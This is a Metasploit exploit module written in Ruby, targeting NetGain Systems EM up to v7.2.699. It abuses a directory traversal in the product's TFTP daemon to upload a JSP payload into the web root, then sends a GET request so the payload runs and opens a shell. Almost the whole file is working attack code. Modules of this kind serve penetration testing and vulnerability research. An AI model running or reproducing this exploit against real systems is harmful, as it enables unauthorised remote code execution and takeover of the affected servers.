require 'msf/core'
require 'open3'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetGain Systems EM Arbitrary File Upload and Execute',
      'Description'    => %q{
	This module exploits a directory traversal in the tftp daemon allowing for 
        an arbitrary file to be placed in the the web root. 
	NetGainSystem EM <= v7.2.699 build 1001. 
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => 'BSD_LICENSE',
      'Platform'       => 'win',
      'Privileged'     => true,
      'References'     =>
        [
          [ 'URL', 'http://www.netgain-systems.com/free-edition/' ],
        ],
      'Targets'        =>
        [
          [ 'Universal Windows Target',
            {
              'Arch'     => ARCH_JAVA,
              'Payload'  =>
                {
                  'DisableNops' => true,
                },
            }
          ],
        ],
      'DefaultOptions' =>
        {
          'SHELL' => 'cmd.exe'
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 06 2017'
    ))

    register_options( [ Opt::RPORT(8081) ], self.class )
  end

  def exploit
      
     file = File.join( Msf::Config.data_directory, 'exploits', "mc-raw.jsp") 
     fname = File.new(file, 'wb')
     fname.write(payload.encoded)
     fname.close
    
     page = "#{rand_text_alpha_upper(5)}" + ".jsp"

    print_status("Uploading file to '#{datastore['RHOST']}'...")

    ::Open3.popen3("tftp -m netascii #{datastore['RHOST']} -c put #{file} ../../../web/#{page}") { |stdin, stdout, stderr, wait_thr| puts stderr.read }

    select(nil,nil,nil,2)
 
    print_status("Removing temp file...")
    ::File.unlink(file)

    print_status("Sending request to trigger payload...")

    res = send_request_raw(
      {
        'uri'		=> '/' + page,
        'version'	=> '1.1',
        'method'	=> 'GET',
      }, 5)
    handler

  end
end
